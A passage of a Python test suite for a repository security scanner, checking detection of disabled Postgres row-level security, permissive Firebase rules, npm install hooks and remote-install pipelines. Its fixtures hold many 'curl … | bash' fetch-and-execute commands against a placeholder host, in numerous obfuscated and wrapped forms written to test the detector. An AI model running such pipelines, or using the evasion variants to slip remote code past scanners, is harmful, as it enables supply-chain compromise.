        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual(
            {
                ("adjacent-do.sql", 2),
                ("adjacent-function.sql", 2),
                ("narrow-execute.sql", 1),
                ("deep-after-literal.sql", 1),
            },
            {(item["path"], item["line"]) for item in findings},
        )
        self.assertEqual([], report["tool_errors"])

    def test_req_008_postgres_nonconstant_execute_expressions_are_not_evaluated(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "dynamic-expressions.sql",
            "DO $$ BEGIN EXECUTE 'ALTER ' || table_name || ' DISABLE ROW LEVEL SECURITY'; END $$;\n"
            "DO $$ BEGIN EXECUTE format('ALTER TABLE %I DISABLE ROW LEVEL SECURITY', table_name); END $$;\n"
            "DO $$ BEGIN EXECUTE format('ALTER TABLE function_only DISABLE ROW LEVEL SECURITY'); END $$;\n"
            "DO $$ BEGIN EXECUTE ('ALTER ' || table_name || ' DISABLE ROW LEVEL SECURITY'); END $$;\n"
            "DO $$ BEGIN EXECUTE concat('ALTER TABLE function_concat DISABLE ROW LEVEL SECURITY'); END $$;\n"
            "DO $$ BEGIN EXECUTE 'ALTER TABLE wrong_cast DISABLE ROW LEVEL SECURITY'::varchar; END $$;\n"
            "DO $$ BEGIN EXECUTE CAST('ALTER TABLE wrong_standard DISABLE ROW LEVEL SECURITY' AS varchar); END $$;\n"
            "DO $$ BEGIN EXECUTE CAST(table_name AS text); END $$;\n"
            "DO $$ BEGIN EXECUTE CAST(format('ALTER TABLE cast_function DISABLE ROW LEVEL SECURITY') AS text); END $$;\n"
            "DO $$ BEGIN EXECUTE 'ALTER TABLE wrong_schema DISABLE ROW LEVEL SECURITY'::application.text; END $$;\n"
            "DO $$ BEGIN EXECUTE 'ALTER TABLE quoted_type DISABLE ROW LEVEL SECURITY'::pg_catalog.\"text\"; END $$;\n"
            "DO $$ BEGIN EXECUTE 'ALTER TABLE text_array DISABLE ROW LEVEL SECURITY'::pg_catalog.text[]; END $$;\n"
            "DO $$ BEGIN EXECUTE 'ALTER ' 'TABLE same_line DISABLE ROW LEVEL SECURITY'; END $$;\n"
            "DO $$ BEGIN EXECUTE 'ALTER ' /* same line */ 'TABLE same_line_comment DISABLE ROW LEVEL SECURITY'; END $$;\n"
            "DO $$ BEGIN EXECUTE 'SELECT ' || '''ALTER TABLE quoted_text DISABLE ROW LEVEL SECURITY'''; END $$;\n"
            r"DO $$ BEGIN EXECUTE U&'ALTER\xyz TABLE invalid_escape DISABLE ROW LEVEL SECURITY'; END $$;" "\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        self.assertEqual(
            [],
            [
                item
                for item in report["findings"]
                if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
            ],
        )

    def test_req_008_postgres_dynamic_literals_and_copy_data_do_not_spoof_rls(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "safe.sql",
            "SELECT $😀$ ALTER TABLE quoted_text DISABLE ROW LEVEL SECURITY; $😀$;\n"
            "DO $$ BEGIN EXECUTE 'SELECT ''ALTER TABLE nested_text DISABLE ROW LEVEL SECURITY'';'; END $$;\n",
        )
        fixture.write(
            "copy.sql",
            "COPY audit_log FROM STDIN;\n"
            " \\. \n"
            "ALTER TABLE copied_text DISABLE ROW LEVEL SECURITY;\n"
            "\\.\n"
            "ALTER TABLE executable_after_copy DISABLE ROW LEVEL SECURITY;\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        findings = [
            item
            for item in report["findings"]
            if item["rule_id"] == "VW-SUPABASE-RLS-DISABLED"
        ]
        self.assertEqual([("copy.sql", 5)], [(item["path"], item["line"]) for item in findings])

    def test_req_008_postgres_executable_projection_is_bounded_and_linear(self) -> None:
        scanner = load_scanner_module()
        repeated = (
            "DO $body$ BEGIN EXECUTE $ddl$ALTER TABLE t DISABLE ROW LEVEL SECURITY;$ddl$; END $body$;\n"
            * 5_000
        )

        started = time.perf_counter()
        offsets = list(scanner._postgres_disabled_rls_offsets(scanner._sql_code_view(repeated)))
        elapsed = time.perf_counter() - started

        self.assertEqual(5_000, len(offsets))
        self.assertLess(elapsed, 2.5, f"executable SQL projection took {elapsed:.3f}s")

        constant_repeated = (
            "DO $$ BEGIN EXECUTE "
            "(('ALTER '::text) || ('TABLE t DISABLE ROW LEVEL SECURITY'::text)); "
            "END $$;\n"
            * 3_000
        )
        started = time.perf_counter()
        constant_offsets = list(
            scanner._postgres_disabled_rls_offsets(
                scanner._sql_code_view(constant_repeated)
            )
        )
        constant_elapsed = time.perf_counter() - started
        self.assertEqual(3_000, len(constant_offsets))
        self.assertLess(
            constant_elapsed,
            2.5,
            f"constant SQL projection took {constant_elapsed:.3f}s",
        )

        cast_repeated = (
            "DO $$ BEGIN EXECUTE CAST("
            "'ALTER TABLE t DISABLE ROW LEVEL SECURITY' AS text)"
            "::pg_catalog.text; END $$;\n"
            * 3_000
        )
        started = time.perf_counter()
        cast_offsets = list(
            scanner._postgres_disabled_rls_offsets(
                scanner._sql_code_view(cast_repeated)
            )
        )
        cast_elapsed = time.perf_counter() - started
        self.assertEqual(3_000, len(cast_offsets))
        self.assertLess(
            cast_elapsed,
            2.5,
            f"cast SQL projection took {cast_elapsed:.3f}s",
        )

        nested = "ALTER TABLE deepest DISABLE ROW LEVEL SECURITY;"
        for depth in range(32):
            nested = (
                f"DO $body{depth}$ BEGIN EXECUTE $ddl{depth}${nested}"
                f"$ddl{depth}$; END $body{depth}$;"
            )
        nested_view = scanner._sql_code_view(nested)
        self.assertTrue(list(scanner._postgres_disabled_rls_offsets(nested_view)))

    def test_req_008_semicolonless_sql_scan_remains_linear(self) -> None:
        scanner = load_scanner_module()
        text = "ALTER TABLE t ENABLE ROW LEVEL SECURITY\n" * 10_000

        started = time.perf_counter()
        offsets = list(scanner._postgres_disabled_rls_offsets(text))
        elapsed = time.perf_counter() - started

        self.assertEqual([], offsets)
        self.assertLess(elapsed, 1.0, f"semicolonless SQL scan took {elapsed:.3f}s")

    def test_req_008_firebase_or_true_and_database_variant_block(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "database.production.rules.json",
            '{"rules":{"items":{'
            '".read":"data.parent().hasChildren([\'a\', \'b\']) || true"}}}\n',
        )
        fixture.write(
            "firestore.rules",
            "allow read:if request.auth != null || true;\n"
            "allow write: if(request.auth != null || true);\n"
            "allow create: if ({'x': 1}['x'] == 1) || true;\n",
        )
        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        findings = [
            item for item in report["findings"]
            if item["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"
        ]
        self.assertEqual(4, len(findings))

    def test_req_009_lockfile_conflict_and_install_script_are_visible(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "package.json",
            json.dumps(
                {
                    "name": "synthetic-project",
                    "private": True,
                    "scripts": {"postinstall": "node verify-install.js"},
                    "dependencies": {"left-pad": "1.3.0"},
                },
                indent=2,
            )
            + "\n",
        )
        fixture.write("package-lock.json", "{}\n")
        fixture.write("yarn.lock", "# synthetic\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-LOCKFILE-CONFLICT", rule_ids)
        self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
        self.assertNotIn("VW-LOCKFILE-MISSING", rule_ids)

    def test_req_009_missing_lock_and_remote_install_are_reported(self) -> None:
        fixture = RepositoryFixture(self)
        remote_command = (
            ("cu" + "rl")
            + " https://invalid.example/tool "
            + "|"
            + " /bin/"
            + ("ba" + "sh")
        )
        fixture.write(
            "package.json",
            json.dumps(
                {
                    "name": "synthetic-project",
                    "scripts": {"install": remote_command},
                    "dependencies": {"package": "1.0.0"},
                },
                indent=2,
            )
            + "\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        rule_ids = {finding["rule_id"] for finding in report["findings"]}
        self.assertIn("VW-LOCKFILE-MISSING", rule_ids)
        self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
        self.assertIn("VW-REMOTE-INSTALL-SCRIPT", rule_ids)

    def test_req_009_package_manifest_rejects_nonstandard_json_constants(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write(
            "package.json",
            '{"name":"synthetic","version":"1.0.0","nan":NaN,"infinity":Infinity}\n',
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertEqual(
            ["VW-MANIFEST-INVALID"],
            [finding["rule_id"] for finding in report["findings"]],
        )

    def test_req_009_all_npm_scripts_are_remote_scanned_and_lifecycle_hooks_are_named(self) -> None:
        fixture = RepositoryFixture(self)
        remote = ("cu" + "rl") + " https://invalid.example/tool | " + ("ba" + "sh")
        scripts = {
            "prepublish": remote,
            "preprepare": remote,
            "postprepare": remote,
            "build": remote,
            "safe": "printf safe",
        }
        fixture.write(
            "package.json",
            json.dumps({"name": "synthetic-project", "scripts": scripts}, indent=2) + "\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        remote_lines = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        lifecycle_lines = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-INSTALL-SCRIPT"
        }
        source_lines = (fixture.root / "package.json").read_text(encoding="utf-8").splitlines()
        expected_remote = {
            index
            for index, line in enumerate(source_lines, start=1)
            if any(f'"{name}"' in line for name in ("prepublish", "preprepare", "postprepare", "build"))
        }
        expected_lifecycle = {
            index
            for index, line in enumerate(source_lines, start=1)
            if any(f'"{name}"' in line for name in ("prepublish", "preprepare", "postprepare"))
        }
        self.assertEqual(expected_remote, remote_lines)
        self.assertEqual(expected_lifecycle, lifecycle_lines)

    def test_req_009_npm_findings_use_effective_scripts_object_and_duplicate_key_line(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "package.json",
            "{\n"
            '  "install": "metadata only",\n'
            '  "scripts": {\n'
            '    "install": "printf safe",\n'
            f'    "install": "{fetcher} https://invalid.example/tool | {shell}"\n'
            "  }\n"
            "}\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        relevant = {
            finding["rule_id"]: finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] in {"VW-INSTALL-SCRIPT", "VW-REMOTE-INSTALL-SCRIPT"}
        }
        self.assertEqual(
            {"VW-INSTALL-SCRIPT": 5, "VW-REMOTE-INSTALL-SCRIPT": 5},
            relevant,
        )

    def test_req_009_npm_line_mapping_matches_unicode_line_separators(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        text = (
            "{\n"
            '  "note": "one\u2028two\u2029three\u0085four",\n'
            '  "scripts": {\n'
            f'    "install": "{fetcher} https://invalid.example/tool | sh"\n'
            "  }\n"
            "}\n"
        )
        fixture.write("package.json", text)

        report = self.json_report(self.run_scanner(fixture.root))
        expected_line = next(
            index
            for index, line in enumerate(text.splitlines(), start=1)
            if '"install"' in line
        )
        relevant = {
            finding["rule_id"]: finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] in {"VW-INSTALL-SCRIPT", "VW-REMOTE-INSTALL-SCRIPT"}
        }
        self.assertEqual(
            {"VW-INSTALL-SCRIPT": expected_line, "VW-REMOTE-INSTALL-SCRIPT": expected_line},
            relevant,
        )

    def test_req_009_remote_install_wrappers_and_multiline_pipelines_block(self) -> None:
        fixture = RepositoryFixture(self)
        first_fetcher = "cu" + "rl"
        second_fetcher = "wg" + "et"
        shell = "ba" + "sh"
        fixture.write(
            "install.sh",
            f"{first_fetcher} https://invalid.example/one | env {shell}\n"
            f"{second_fetcher} https://invalid.example/two |\n {shell}\n"
            f"{first_fetcher} https://invalid.example/three | command {shell}\n"
            f"{second_fetcher} https://invalid.example/four | \\\n {shell}\n"
            f"{first_fetcher} 'https://invalid.example/five?a=1&b=2' | {shell}\n"
            f"{second_fetcher} https://invalid.example/six | sudo -u root {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual(6, len(findings))
        self.assertEqual({1, 2, 4, 5, 7, 8}, {finding["line"] for finding in findings})

    def test_req_009_nested_fragment_and_windows_remote_pipelines_block(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "nested.sh",
            f"{fetcher} https://invalid.example/install#fragment | {shell}\n"
            f"sh -c '{fetcher} https://invalid.example/install | {shell}'\n"
            f'result="$({fetcher} https://invalid.example/install | {shell})"\n'
            f"{fetcher}.exe https://invalid.example/install | {shell}.exe\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({1, 2, 3, 4}, {finding["line"] for finding in findings})

    def test_req_009_shell_c_text_is_only_scanned_when_the_shell_executes(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        nested = f"{fetcher} https://invalid.example/install | {shell}"
        fixture.write(
            "commands.sh",
            f"echo sh -c '{nested}'\n"
            f"printf '%s' sh -c '{nested}'\n"
            f"echo safe; sh -c '{nested}'\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual([3], [finding["line"] for finding in findings])

    def test_req_009_shell_redirections_options_substitutions_and_windows_forms_block(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        nested = f"{fetcher} https://invalid.example/install | {shell}"
        fixture.write(
            "variants.sh",
            f"{fetcher} https://invalid.example/redirect 2>&1 | {shell}\n"
            f"env -- {shell} --rcfile synthetic.rc --noprofile -O extglob -c -- '{nested}'\n"
            f"cat <({nested})\n"
            f"cat >({nested})\n"
            f'"C:\\Tools\\{fetcher}.exe" https://invalid.example/windows | '
            f'"C:\\Tools\\{shell}.exe"\n'
            f"C:\\Tools\\{fetcher}.exe https://invalid.example/windows-unquoted | "
            f"C:\\Tools\\{shell}.exe\n"
            f'cmd.exe /c "{fetcher}.exe https://invalid.example/cmd | {shell}.exe"\n'
            f'echo "<({nested})"\n'
            f"printf '%s' '{nested}'\n"
            f"echo {'x' * 10_000} {nested}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({1, 2, 3, 4, 5, 6, 7}, {finding["line"] for finding in findings})
        self.assertNotIn(
            "VW-SHELL-PIPELINE-UNPARSED",
            {finding["rule_id"] for finding in report["findings"]},
        )

    def test_req_009_execution_wrappers_block_without_treating_data_as_shell(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "s" + "h"
        nested = f"{fetcher} https://invalid.example/install | {shell}"
        fixture.write(
            "wrappers.sh",
            f'env -S \'{shell} -c "{nested}"\'\n'
            f'env --split-string=\'{shell} -c "{nested}"\'\n'
            f"eval '{nested}'\n"
            f"{fetcher} https://invalid.example/busybox | busybox {shell}\n"
            f"{fetcher} https://invalid.example/nohup | nohup {shell}\n"
            f"{fetcher} https://invalid.example/timeout | timeout 10 {shell}\n"
            f"echo '{nested}'\n"
            f"printf '%s' '{nested}'\n"
            f"env -S '{nested}'\n"
            f"{fetcher} https://invalid.example/query | command -v {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        findings = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual({1, 2, 3, 4, 5, 6}, {finding["line"] for finding in findings})
        self.assertNotIn(
            "VW-SHELL-PIPELINE-UNPARSED",
            {finding["rule_id"] for finding in report["findings"]},
        )

    def test_req_009_negation_and_time_wrappers_cannot_hide_remote_execution(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "wrappers.sh",
            f"! {fetcher} https://invalid.example/negated | {shell}\n"
            f"time {fetcher} https://invalid.example/timed | {shell}\n"
            f"time -p {fetcher} https://invalid.example/portable | {shell}\n"
            f"time --format elapsed {fetcher} https://invalid.example/formatted | {shell}\n"
            f"time --unknown {fetcher} https://invalid.example/ambiguous | {shell}\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)

        self.assertEqual(1, completed.returncode)
        remote = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        unparsed = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        }
        self.assertEqual({1, 2, 3, 4}, remote)
        self.assertEqual({5}, unparsed)

    def test_req_009_control_words_and_process_wrappers_cannot_hide_remote_execution(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        fixture.write(
            "wrappers.sh",
            f"nice {fetcher} https://invalid.example/nice | {shell}\n"
            f"setsid {fetcher} https://invalid.example/setsid | python3\n"
            f"builtin command {fetcher} https://invalid.example/builtin | sh\n"
            f"if {fetcher} https://invalid.example/if | {shell}; then :; fi\n"
            f"while {fetcher} https://invalid.example/while | {shell}; do :; done\n"
            f"nice --unknown {fetcher} https://invalid.example/nice-ambiguous | {shell}\n"
            f"setsid --unknown {fetcher} https://invalid.example/setsid-ambiguous | sh\n"
            f"builtin {fetcher} https://invalid.example/not-a-builtin | sh\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        unparsed = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        }
        self.assertEqual({1, 2, 3, 4, 5}, remote)
        self.assertEqual({6, 7, 8}, unparsed)

    def test_req_009_nested_launchers_redirections_and_substitutions_block(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        shell = "ba" + "sh"
        remote = f"{fetcher} https://invalid.example/tool"
        quoted_fetcher = fetcher[0] + '""' + fetcher[1:]
        escaped_fetcher = fetcher[0] + "\\" + fetcher[1:]
        ansi_quoted_fetcher = fetcher[0] + "$'" + fetcher[1] + "'" + fetcher[2:]
        fixture.write(
            "launchers.sh",
            f"2>/dev/null {remote} | {shell}\n"
            f"{remote} | 2>/dev/null {shell}\n"
            f"builtin exec {remote} | {shell}\n"
            f"builtin eval '{remote}' | {shell}\n"
            f"time ! {remote} | {shell}\n"
            f"case x in x) {remote} | {shell};; esac\n"
            f"f() {{ {remote} | {shell}; }}; f\n"
            f"busybox nice {remote} | {shell}\n"
            f"until {remote} | {shell}; do :; done\n"
            f"coproc {remote} | {shell}\n"
            f"{remote} | source /dev/stdin\n"
            f"{remote} | nice {shell}\n"
            f"stdbuf -o0 {remote} | sh\n"
            f"ionice {remote} | sh\n"
            f"taskset -c 0 {remote} | sh\n"
            f"command nice {remote} | sh\n"
            f"{remote} | tee >({shell})\n"
            f"{remote} > >({shell})\n"
            f"{shell} <({remote})\n"
            f'{shell} -c "$({remote})"\n'
            f"chrt 0 {remote} | sh\n"
            f"doas {remote} | sh\n"
            f"synthetic-launcher {remote} | sh\n"
            f"printf '%s' '{remote} | {shell}'\n"
            f"{remote} | cat\n"
            f'{shell} <<< "$({remote})"\n'
            f"{remote} | xargs -0 sh -c\n"
            f"{quoted_fetcher} https://invalid.example/quoted | sh\n"
            f"{escaped_fetcher} https://invalid.example/escaped | sh\n"
            f"{shell} -c $'{remote} | sh'\n"
            f"echo '{remote} | sh' | sh\n"
            f"printf '%s' '{remote} | sh' | {shell}\n"
            f"{shell} -s <<< '{remote} | sh'\n"
            f"{remote} | cmd.exe\n"
            f"{remote} | busybox ash\n"
            f"{shell} 0<<<'{remote} | sh'\n"
            f"{ansi_quoted_fetcher} https://invalid.example/ansi-quoted | sh\n"
            f'{shell} -c "$(printf \'%s\' \'{remote} | sh\')"\n'
            f'eval "$(printf \'%s\' \'{remote} | sh\')"\n'
            f'{shell} <<< "$(printf \'%s\' \'{remote} | sh\')"\n'
            f"{shell} -c $'{fetcher} https://invalid.example/encoded \\x7c sh'\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        blocked = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        unparsed = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        }
        self.assertEqual(set(range(1, 23)) | set(range(26, 42)), blocked)
        self.assertEqual({23}, unparsed)

    def test_req_009_compound_commands_and_unknown_shell_launchers_fail_closed(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "compound.sh",
            f"{{ {fetcher} https://invalid.example/braces; }} | sh\n"
            f"( {fetcher} https://invalid.example/subshell; ) | sh\n"
            f"if true; then {fetcher} https://invalid.example/conditional; fi | sh\n"
            f"{fetcher} https://invalid.example/download; echo local | sh\n"
            f"{{ echo {fetcher}; }} | sh\n"
            f"{fetcher} https://invalid.example/trace | strace sh\n"
            f"{fetcher} https://invalid.example/valgrind | valgrind sh\n"
            f"{{ {fetcher} https://invalid.example/stderr; }} 2>/dev/null | sh\n"
            f"{{ {fetcher} https://invalid.example/data; }} | printf sh\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        unparsed = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        }
        self.assertEqual({1, 2, 3, 8}, remote)
        self.assertEqual({6, 7}, unparsed)

    def test_req_009_executable_heredoc_expansion_cannot_hide_remote_content(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "heredoc.sh",
            "bash <<EOF\n"
            f"$({fetcher} https://invalid.example/tool)\n"
            "EOF\n"
            "cat <<'EOF' | sh\n"
            f"{fetcher} https://invalid.example/tool | sh\n"
            "EOF\n"
            "cat /dev/null | sh <<'EOF'\n"
            f"{fetcher} https://invalid.example/tool | sh\n"
            "EOF\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote = [
            finding
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        ]
        self.assertEqual([2, 5, 8], [finding["line"] for finding in remote])

    def test_req_009_multiple_heredocs_execute_only_effective_stdin_bodies(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "multiple-heredocs.sh",
            "bash 3<<'DATA' 0<<'SCRIPT'\n"
            f"$({fetcher} https://invalid.example/not-code)\n"
            "DATA\n"
            f"$({fetcher} https://invalid.example/code)\n"
            "SCRIPT\n"
            "bash 0<<'FIRST' 0<<'SECOND'\n"
            f"$({fetcher} https://invalid.example/overridden)\n"
            "FIRST\n"
            f"$({fetcher} https://invalid.example/effective)\n"
            "SECOND\n"
            "cat <<'PIPE_DATA' | sh <<'SHELL_CODE'\n"
            f"{fetcher} https://invalid.example/disconnected | sh\n"
            "PIPE_DATA\n"
            f"{fetcher} https://invalid.example/downstream | sh\n"
            "SHELL_CODE\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote_lines = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        self.assertEqual({4, 9, 14}, remote_lines)

    def test_req_009_aliases_and_functions_follow_order_scope_and_quoting(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "dynamic-sources.sh",
            f"FETCH={fetcher}\n"
            "$FETCH https://invalid.example/alias | sh\n"
            "FETCH=printf\n"
            "$FETCH https://invalid.example/reassigned | sh\n"
            "fetch() {\n"
            f"  {fetcher} https://invalid.example/${{URL}}\n"
            "}\n"
            "fetch | sh\n"
            "fetch(){ printf '%s' curl; }\n"
            "fetch | sh\n"
            f"FETCH={fetcher}; $FETCH https://invalid.example/ordered | sh; FETCH=printf\n"
            f"FETCH=printf; $FETCH https://invalid.example/before | sh; FETCH={fetcher}\n"
            "'$FETCH' https://invalid.example/literal | sh\n"
            "\\$FETCH https://invalid.example/escaped | sh\n"
            f"Fetch(){{ {fetcher} https://invalid.example/case; }}\n"
            "fetch | sh\n"
            "FETCH=printf\n"
            f"FETCH = {fetcher}\n"
            "$FETCH https://invalid.example/invalid-assignment | sh\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        remote_lines = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        self.assertEqual({2, 8, 11}, remote_lines)

    def test_req_009_dynamic_interpreters_fail_closed_but_literals_remain_data(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "dynamic-interpreters.sh",
            f'{fetcher} https://invalid.example/a | "${{SHELL}}"\n'
            f"{fetcher} https://invalid.example/b | ${{SHELL:-sh}}\n"
            f'{fetcher} https://invalid.example/c | "${{SHELL##*/}}"\n'
            f'cmd.exe /c "{fetcher} https://invalid.example/d | %COMSPEC%"\n'
            f'%COMSPEC% /c "{fetcher} https://invalid.example/e | sh.exe"\n'
            f"{fetcher} https://invalid.example/f | '${{SHELL}}'\n"
            f"{fetcher} https://invalid.example/g | \\${{SHELL}}\n",
        )

        report = self.json_report(self.run_scanner(fixture.root))
        unparsed_lines = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
        }
        remote_lines = {
            finding["line"]
            for finding in report["findings"]
            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
        }
        self.assertEqual({1, 2, 3, 4, 5}, unparsed_lines)
        self.assertEqual(set(), remote_lines)

    def test_req_009_dynamic_symbols_do_not_cross_execution_scopes(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "scopes.yml",
            "steps:\n"
            "  - run: |\n"
            f"      FETCH={fetcher}\n"
            "      echo safe\n"
            "  - run: |\n"
            "      $FETCH https://invalid.example/literal | sh\n"
            "folded-one:\n"
            "  run: >\n"
            f"    FETCH={fetcher};\n"
            "    echo safe\n"
            "folded-two:\n"
            "  run: >\n"
            "    $FETCH https://invalid.example/folded | sh\n",
        )
        fixture.write(
            "heredoc-scope.sh",
            "bash <<'SCRIPT'\n"
            f"FETCH={fetcher}\n"
            "SCRIPT\n"
            "$FETCH https://invalid.example/outer | sh\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(1, completed.returncode)
        self.assertEqual(
            {
                ("heredoc-scope.sh", 4),
                ("scopes.yml", 6),
                ("scopes.yml", 13),
            },
            {
                (item["path"], item["line"])
                for item in report["findings"]
                if item["rule_id"] == "VW-SHELL-PIPELINE-UNPARSED"
            },
        )
        self.assertNotIn(
            "VW-REMOTE-INSTALL-SCRIPT",
            {item["rule_id"] for item in report["findings"]},
        )

    def test_req_009_dynamic_symbol_budget_fails_closed(self) -> None:
        scanner = load_scanner_module()
        fetcher = "cu" + "rl"
        text = (
            f"FIRST={fetcher}\n"
            f"SECOND={fetcher}\n"
            f"THIRD={fetcher}\n"
            "echo safe | sh\n"
        )

        with mock.patch.object(scanner, "MAX_REMOTE_SHELL_SYMBOLS", 2):
            remote, unparsed = scanner._remote_pipe_line_numbers(text)

        self.assertEqual([], remote)
        self.assertEqual([3], unparsed)

    def test_req_009_descriptor_heredocs_remain_data_only(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "data.sh",
            "cat 0<<'EOF'\n"
            f"{fetcher} https://invalid.example/data | sh\n"
            "EOF\n"
            "cat {fd}<<'EOF'\n"
            f"{fetcher} https://invalid.example/more-data | sh\n"
            "EOF\n"
            "cat {fd}<<'EOF' | sh\n"
            f"{fetcher} https://invalid.example/not-stdin | sh\n"
            "EOF\n"
            "bash 3<<'EOF'\n"
            f"{fetcher} https://invalid.example/not-script-input | sh\n"
            "EOF\n",
        )

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual([], report["findings"])

    def test_req_009_folded_yaml_and_docker_heredocs_are_scanned_as_shell(self) -> None:
        fixture = RepositoryFixture(self)
        fetcher = "cu" + "rl"
        fixture.write(
            "contexts.txt",
            "run: >\n"
            f"  {fetcher} https://invalid.example/yaml\n"
            "  | sh\n"
            "RUN <<EOF\n"
            f"{fetcher} https://invalid.example/docker | sh\n"
            "EOF\n"
            "RUN <<'EOF'\n"
            f"{fetcher} https://invalid.example/docker-quoted | sh\n"
